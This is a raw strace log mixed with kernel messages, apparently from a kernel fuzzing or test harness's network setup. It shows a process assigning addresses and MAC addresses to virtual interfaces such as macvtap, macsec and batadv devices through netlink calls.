[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="ipvlan1", ifr_ifindex=60}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x0a\x78\x00\x00\x3c\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x36\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x36"], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="ipvlan1", ifr_ifindex=60}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x3c\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x36\x00\x00"], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=64, nlmsg_type=NLMSG_ERROR, nlmsg_flags=0, nlmsg_seq=0, nlmsg_pid=1}, {error=-EOPNOTSUPP, msg=[{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x3c\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x36\x00\x00"]}], 4096, 0, NULL, NULL) = 64
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth0_macvtap", ifr_ifindex=62}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x3e\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x37\x08\x00\x01\x00\xac\x14\x14\x37"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[   77.629123][ T5086] veth1_vlan: entered promiscuous mode
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth0_macvtap", ifr_ifindex=62}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x0a\x78\x00\x00\x3e\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x37\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x37"], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth0_macvtap", ifr_ifindex=62}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x3e\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x37\x00\x00"], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth1_macvtap", ifr_ifindex=61}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x3d\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x38\x08\x00\x01\x00\xac\x14\x14\x38"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth1_macvtap", ifr_ifindex=61}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x0a\x78\x00\x00\x3d\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x38\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x38"], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth1_macvtap", ifr_ifindex=61}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x3d\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x38\x00\x00"], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="macvtap0", ifr_ifindex=63}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x3f\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x39\x08\x00\x01\x00\xac\x14\x14\x39"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="macvtap0", ifr_ifindex=63}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x0a\x78\x00\x00\x3f\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x39\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x39"], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="macvtap0", ifr_ifindex=63}) = 0
[pid  5086] close(4)                    = 0
[   77.717841][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): macvlan0: link becomes ready
[   77.725986][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): macvlan1: link becomes ready
[   77.735899][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): veth1_macvtap: link becomes ready
[   77.745600][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): veth0_macvtap: link becomes ready
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x3f\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x39\x00\x00"], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="macsec0", ifr_ifindex=64}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x40\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x3a\x08\x00\x01\x00\xac\x14\x14\x3a"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="macsec0", ifr_ifindex=64}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x0a\x78\x00\x00\x40\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x3a\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x3a"], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="macsec0", ifr_ifindex=64}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x40\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x3a\x00\x00"], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth0_to_batadv", ifr_ifindex=40}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x28\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x3b\x08\x00\x01\x00\xac\x14\x14\x3b"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth0_to_batadv", ifr_ifindex=40}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x0a\x78\x00\x00\x28\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x3b\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x3b"], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth0_to_batadv", ifr_ifindex=40}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x28\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x3b\x00\x00"], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth1_to_batadv", ifr_ifindex=42}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x2a\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x3c\x08\x00\x01\x00\xac\x14\x14\x3c"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth1_to_batadv", ifr_ifindex=42}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x0a\x78\x00\x00\x2a\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x3c\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x3c"], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="veth1_to_batadv", ifr_ifindex=42}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x2a\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x3c\x00\x00"], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="batadv_slave_0", ifr_ifindex=41}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x29\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x3d\x08\x00\x01\x00\xac\x14\x14\x3d"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="batadv_slave_0", ifr_ifindex=41}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x0a\x78\x00\x00\x29\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x3d\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x3d"], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="batadv_slave_0", ifr_ifindex=41}) = 0
[   77.768659][ T5086] veth0_macvtap: entered promiscuous mode
[   77.793525][ T5086] veth1_macvtap: entered promiscuous mode
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, "\x00\x00\x00\x00\x29\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x3d\x00\x00"], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="batadv_slave_1", ifr_ifindex=43}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, "\x02\x18\x00\x00\x2b\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x3e\x08\x00\x01\x00\xac\x14\x14\x3e"], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name="batadv_slave_1", ifr_ifindex=43}) = 0
[pid  5086] close(4)                    = 0
